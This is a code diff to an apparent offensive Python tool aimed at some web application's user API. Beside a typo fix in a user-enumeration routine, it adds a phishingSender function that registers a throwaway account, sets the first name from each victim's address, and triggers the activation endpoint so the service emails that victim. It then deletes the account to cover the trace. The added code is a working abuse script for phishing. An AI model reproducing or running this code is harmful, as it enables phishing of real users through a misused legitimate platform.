@@ -56,8 +56,30 @@ def senderEnumeration(usersList):
             urlDelete = apiURL+"/"+reqResult["_id"]
             reqDelete = requests.delete(urlDelete, headers=headers)
         else:
-            sys.exit("An error ocurred while sending requests to the API.")
-            
+            sys.exit("An error occurred while sending requests to the API.")
+
+def phishingSender(usersList):
+    for user in usersList:
+        #HTTP request payload
+        data = {
+            "username":"durandas",          #random name to register on the domain
+            "firstname":user.split('.')[0], #take user in format firstname.lastname@domain.tld
+            "email":"dur4ndal@1337.lol"     #random email to register on the domain
+        }
+        req = requests.post(apiURL,headers=headers,json=data)
+        if req.status_code == 200:
+            reqResult = json.loads(req.text)
+            urlActivate = apiURL+"/"+reqResult["_id"]+"/state/activate"
+            payload = {
+                "email":user
+            }
+            reqPhishingSend = requests.post(urlActivate,headers=headers,json=payload)
+            print(user, reqPhishingSend.status_code)
+            urlDelete = apiURL+"/"+reqResult["_id"]
+            reqDelete = requests.delete(urlDelete,headers=headers)
+            print(reqDelete.status_code)
+        else:
+            sys.exit("An error occurred while user register.")
 
 
 
